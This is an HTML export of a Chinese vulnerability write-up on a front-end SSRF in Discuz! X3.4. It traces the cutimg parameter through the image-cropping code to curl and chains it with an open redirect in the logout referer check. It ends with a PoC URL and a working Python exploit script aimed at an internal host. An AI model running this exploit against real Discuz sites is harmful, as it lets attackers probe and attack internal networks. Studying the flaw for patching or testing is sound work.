<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs24C36B3{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="discuz-x34-前台ssrf"><span class="csDE05BCC">Discuz! X3.4 </span><span class="csECDA2D3">前台</span><span class="csDE05BCC">ssrf</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">DDiscuz! X3.4 source/module/misc/misc_imgcropper.php</span><span class="cs9C1B1871">页面中的</span><span class="cs8926E06">cutimg</span><span class="cs9C1B1871">参数，因为应用程序的远程下载功能过滤不严，配合前台任意</span><span class="cs8926E06">URL</span><span class="cs9C1B1871">跳转漏洞，可以造成</span><span class="cs8926E06">SSRF</span><span class="cs9C1B1871">漏洞，可以对与外部隔离的内部环境进行探测和攻击</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs8926E06">&lt;= x3.4</span></li><li class="cs24C36B3"><span class="cs8926E06">windows</span></li><li class="cs24C36B3"><span class="cs8926E06">php&gt;5.3+php-curl&lt;=7.54</span></li><li class="cs24C36B3"><span class="cs8926E06">DZ</span><span class="cs9C1B1871">开放在</span><span class="cs8926E06">80</span><span class="cs9C1B1871">端口</span></li></ul>
		<h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="csE3F655E4">本地</span><span class="cs5BEC2C28">ssrf</span></p><p class="cs40DD2BC9"><span class="cs8926E06">/source/module/misc/misc_imgcropper.php 55</span><span class="cs9C1B1871">行</span></p><p class="cs3A447A38"><span class="cs9FB05234">&nbsp; &nbsp;&nbsp;require_once libfile(&#39;class/image&#39;); &nbsp;&nbsp;&nbsp;$image = new image(); &nbsp;&nbsp;$prefix = $_GET[&#39;picflag&#39;] == 2 ? $_G[&#39;setting&#39;][&#39;ftp&#39;][&#39;attachurl&#39;] : $_G[&#39;setting&#39;][&#39;attachurl&#39;]; if(!$image-&gt;Thumb($prefix.$_GET[&#39;cutimg&#39;], $cropfile, $picwidth, $picheight)) { &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;showmessage(&#39;imagepreview_errorcode_&#39;.$image-&gt;errorcode, null, null, array(&#39;showdialog&#39; =&gt; true, &#39;closetime&#39; =&gt; true)); &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$prefix`</span><span class="cs7FFD2630">可以通过</span><span class="cs9FB05234">GET</span><span class="cs7FFD2630">传递</span><span class="cs9FB05234">`$_GET[&#39;picflag&#39;]`</span><span class="cs7FFD2630">为</span><span class="cs9FB05234">2</span><span class="cs7FFD2630">进行三元操作，变成了默认的</span><span class="cs9FB05234">`/`</span><span class="cs7FFD2630">，然后和</span><span class="cs9FB05234">`$_GET[&#39;cutimg&#39;]`</span><span class="cs7FFD2630">进行拼接作为第一个参数传进了</span><span class="cs9FB05234">`$image-&gt;Thumb</span></p><p class="cs40DD2BC9"><span class="cs8926E06">source/class/class_image.php 51</span><span class="cs9C1B1871">行</span></p><p class="cs3A447A38"><span class="cs9FB05234">&nbsp; &nbsp;&nbsp;function Thumb($source, $target, $thumbwidth, $thumbheight, $thumbtype = 1, $nosuffix = 0) { &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$return = $this-&gt;init(&#39;thumb&#39;, $source, $target, $nosuffix); }</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">拼接后的参数作为</span><span class="cs9FB05234">$source</span><span class="cs9C1B1871">又传进了</span><span class="cs8926E06">init</span><span class="cs9C1B1871">函数</span></p><p class="cs40DD2BC9"><span class="cs8926E06">source/class/class_image.php 118</span><span class="cs9C1B1871">行</span></p><p class="cs3A447A38"><span class="cs9FB05234">&nbsp; &nbsp;&nbsp;function init($method, $source, $target, $nosuffix = 0) { &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;global $_G; &nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;errorcode = 0; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(empty($source)) { &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return -2; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$parse = parse_url($source); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(isset($parse[&#39;host&#39;])) { &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(empty($target)) { &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return -2; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data = dfsockopen($source); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;tmpfile = $source = tempnam($_G[&#39;setting&#39;][&#39;attachdir&#39;].&#39;./temp/&#39;, &#39;tmpimg_&#39;); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!$data || $source === FALSE) { &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return -2; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file_put_contents($source, $data); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以发现如果</span><span class="cs9FB05234">$source</span><span class="cs9C1B1871">经过</span><span class="cs9FB05234">parse_url</span><span class="cs9C1B1871">的解析结果中如果包含</span><span class="cs8926E06">host</span><span class="cs9C1B1871">字段就不结束流程，然后将</span><span class="cs9FB05234">$source</span><span class="cs9C1B1871">参数传入</span><span class="cs9FB05234">dfsockopen</span><span class="cs9C1B1871">函数。</span><span class="cs8926E06">Php</span><span class="cs9C1B1871">中的</span><span class="cs9FB05234">parse_url</span><span class="cs9C1B1871">函数是可以对</span><span class="cs9FB05234">//</span><span class="cs9C1B1871">开头的域名进行解析的</span><span class="cs8926E06">, </span><span class="cs9FB05234">$source</span><span class="cs9C1B1871">本身就是</span><span class="cs9FB05234">/</span><span class="cs9C1B1871">开头，因此只需要通过开始的</span><span class="cs9FB05234">$_GET[&#39;cutimg&#39;]</span><span class="cs9C1B1871">注入</span><span class="cs9FB05234">/www.0-sec.org</span><span class="cs7FFD2630">，变成</span><span class="cs8926E06">//www.0-sec.org`</span><span class="cs9C1B1871">即可继续执行。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/Discuz!%20X3.4%20%e5%89%8d%e5%8f%b0ssrf_files/image0.png" width="560" height="273" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">source/function/function_core.php 199</span><span class="cs9C1B1871">行</span></p><p class="cs3A447A38"><span class="cs9FB05234">function dfsockopen($url, $limit = 0, $post = &#39;&#39;, $cookie = &#39;&#39;, $bysocket = FALSE, $ip = &#39;&#39;, $timeout = 15, $block = TRUE, $encodetype &nbsp;= &#39;URLENCODE&#39;, $allowcurl = TRUE, $position = 0, $files = array()) { &nbsp;&nbsp;&nbsp;require_once libfile(&#39;function/filesock&#39;); &nbsp;return _dfsockopen($url, $limit, $post, $cookie, $bysocket, $ip, $timeout, $block, $encodetype, $allowcurl, $position, $files);}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">进入</span><span class="cs8926E06">dfsockopen</span><span class="cs9C1B1871">函数后，我们构造的字符串变为</span><span class="cs8926E06">$url</span><span class="cs9C1B1871">，然后传入了</span><span class="cs8926E06">_dfsockopen</span><span class="cs9C1B1871">函数。</span></p><p class="cs40DD2BC9"><span class="cs8926E06">dz/source/function/function_filesock.php 31</span><span class="cs9C1B1871">行</span></p><p class="cs40DD2BC9"><span class="cs8926E06">image</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">发起了</span><span class="cs8926E06">curl</span><span class="cs9C1B1871">请求，就是这里触发了</span><span class="cs8926E06">ssrf</span><span class="cs9C1B1871">，这里的现有使用后</span><span class="cs8926E06">parse_url</span><span class="cs9C1B1871">解析了一次</span><span class="cs8926E06">$url</span><span class="cs9C1B1871">，和上面的解析是一样的，然后又进行了拼接成为了</span><span class="cs8926E06">curl</span><span class="cs9C1B1871">的地址。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/Discuz!%20X3.4%20%e5%89%8d%e5%8f%b0ssrf_files/image1.png" width="560" height="12" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">其</span><span class="cs8926E06">$scheme</span><span class="cs9C1B1871">为空，如果我们为</span><span class="cs8926E06">cutimg</span><span class="cs9C1B1871">传入</span><span class="cs8926E06">/dz//member.php</span><span class="cs9C1B1871">，那么到就会变成</span><span class="cs8926E06">://dz//member.php</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/Discuz!%20X3.4%20%e5%89%8d%e5%8f%b0ssrf_files/image2.png" width="560" height="241" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs8926E06">php</span><span class="cs9C1B1871">的</span><span class="cs8926E06">curl</span><span class="cs9C1B1871">中我们尝试访问</span><span class="cs8926E06">://dz/forum.php</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/Discuz!%20X3.4%20%e5%89%8d%e5%8f%b0ssrf_files/image3.png" width="560" height="424" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以发现无指定协议的默认就是</span><span class="cs8926E06">http</span><span class="cs9C1B1871">协议，</span><span class="cs8926E06">://</span><span class="cs9C1B1871">是代表访问本地</span><span class="cs8926E06">dz/forum.php</span><span class="cs9C1B1871">表示路径和</span><span class="cs8926E06">path</span><span class="cs9C1B1871">，因此能够访问首页，到这里就有了一个可以对通网站下进行</span><span class="cs8926E06">ssrf</span><span class="cs9C1B1871">的漏洞点。</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Curl</span><span class="cs9C1B1871">的配置当中开启了跳转</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/Discuz!%20X3.4%20%e5%89%8d%e5%8f%b0ssrf_files/image4.png" width="560" height="22" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">再找到一个站内的</span><span class="cs8926E06">url</span><span class="cs9C1B1871">跳转，就能绕过站内</span><span class="cs8926E06">curl</span><span class="cs9C1B1871">的限制，实现真正的</span><span class="cs8926E06">ssrf</span><span class="cs9C1B1871">。</span></p><h3 class="cs868C439D">
			<a name="前台任意url跳转"><span class="csD6CA00D2">前台任意</span><span class="csD1E291E2">url</span><span class="csD6CA00D2">跳转</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs8926E06">/source/class/class_member.php 310</span><span class="cs9C1B1871">行</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/Discuz!%20X3.4%20%e5%89%8d%e5%8f%b0ssrf_files/image5.png" width="560" height="97" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">调用了</span><span class="cs8926E06">dreferer()</span><span class="cs9C1B1871">结果作为跳转地址，继续跟进该函数。</span></p><p class="cs40DD2BC9"><span class="cs8926E06">source/function/function_core.php 1498</span><span class="cs9C1B1871">行</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/Discuz!%20X3.4%20%e5%89%8d%e5%8f%b0ssrf_files/image6.png" width="560" height="205" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9FB05234">$_G[&#39;referer&#39;]</span><span class="cs9C1B1871">这个参数我们可控，同样使用了</span><span class="cs9FB05234">parse_url</span><span class="cs9C1B1871">进行了解析，首先对协议进行了判断，需要属于</span><span class="cs9FB05234">http/https</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后又对</span><span class="cs8926E06">host</span><span class="cs9C1B1871">字段和</span><span class="cs9FB05234">$_SERVER[&#39;HTTP_HOST&#39;]</span><span class="cs9C1B1871">进行了对比，判断是否在同一个域名下，因为攻击中是通过</span><span class="cs8926E06">curl</span><span class="cs9C1B1871">发起的请求，</span><span class="cs8926E06">$_SERVER[&lsquo;HTTP_HOST&rsquo;]</span><span class="cs9C1B1871">此时为空，但是和</span><span class="cs8926E06">www.</span><span class="cs9C1B1871">进行了，因此这里域名为</span><span class="cs9FB05234">www.</span><span class="cs9C1B1871">即可绕过判断成功注入</span><span class="cs8926E06">location</span><span class="cs9C1B1871">字段</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">此时处理跳转的是</span><span class="cs8926E06">php</span><span class="cs9C1B1871">的</span><span class="cs8926E06">curl</span><span class="cs9C1B1871">，</span><span class="cs8926E06">curl</span><span class="cs9C1B1871">这里会因为</span><span class="cs9FB05234">#@</span><span class="cs9C1B1871">出现解析问题，会跳转到</span><span class="cs8926E06">192.168.2.63:6666</span><span class="cs9C1B1871">，也就是形成</span><span class="cs8926E06">ssrf</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/Discuz!%20X3.4%20%e5%89%8d%e5%8f%b0ssrf_files/image7.png" width="560" height="209" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">站内</span><span class="cs8926E06">ssrf-&gt;</span><span class="cs9C1B1871">前台</span><span class="cs8926E06">get</span><span class="cs9C1B1871">型的任意</span><span class="cs8926E06">url</span><span class="cs9C1B1871">跳转</span><span class="cs8926E06">-&gt;ssrf</span><span class="cs9C1B1871">漏洞</span></p><p class="cs40DD2BC9"><span class="csE3F655E4">总结</span><span class="cs9C1B1871">：</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">因为应用程序的远程下载功能过滤不严，利用</span><span class="cs8926E06">php</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">parse_url</span><span class="cs9C1B1871">还有</span><span class="cs8926E06">curl</span><span class="cs9C1B1871">解析特性，配合前台任意</span><span class="cs8926E06">URL</span><span class="cs9C1B1871">跳转漏洞，可以造成</span><span class="cs8926E06">SSRF</span><span class="cs9C1B1871">漏洞。</span></p><h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">htp://www.0-sec.org/code-src/dz/Discuz_TC_BIG5/upload/member.php?mod=logging&amp;action=logout&amp;XDEBUG_SESSION_START=13904&amp;referer=http://localhost%23%40www.baidu.com&amp;quickforward=1</span></p><h3 class="cs868C439D">
			<a name="python-脚本"><span class="csD1E291E2">python </span><span class="csD6CA00D2">脚本</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234"># coding=utf-8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import re</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from urllib.parse import urlparse, quote</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from urllib import parse</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if __name__ == &quot;__main__&quot;:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;url = &quot;http://192.168.66.129/dz/&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ssrf_target = &quot;192.168.0.36:6666&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;path = urlparse(url).path</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;payload = quote(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;/member.php?mod=logging&amp;action=logout&amp;quickforward=1&amp;referer=http://www.%23%40{ssrf_target}&quot;.format(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ssrf_target=ssrf_target))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;s = requests.Session()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;html = s.get(url).text</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;searchObj = re.search(r&#39;name=&quot;formhash&quot; value=&quot;(.*?)&quot;&#39;, html, re.M | re.I)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;formhash = searchObj.group(1)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;rs = s.post(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;url + &quot;misc.php?mod=imgcropper&amp;imgcroppersubmit=1&amp;formhash={formhash}&amp;picflag=2&amp;cutimg={path}{payload}&quot;.format(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;formhash=formhash, path=path, payload=payload))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exit()</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/Discuz!%20X3.4%20%e5%89%8d%e5%8f%b0ssrf_files/image8.png" width="560" height="412" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06"><a class="cs508254C" href="http://www.rai4over.cn/2018/12/07/Discuz-3-4前台有限制SSRF漏洞/index.html"><span class="cs4B51D5E4">http://www.rai4over.cn/2018/12/07/Discuz-3-4%E5%89%8D%E5%8F%B0%E6%9C%89%E9%99%90%E5%88%B6SSRF%E6%BC%8F%E6%B4%9E/index.html</span></a></span></p></body>
</html>
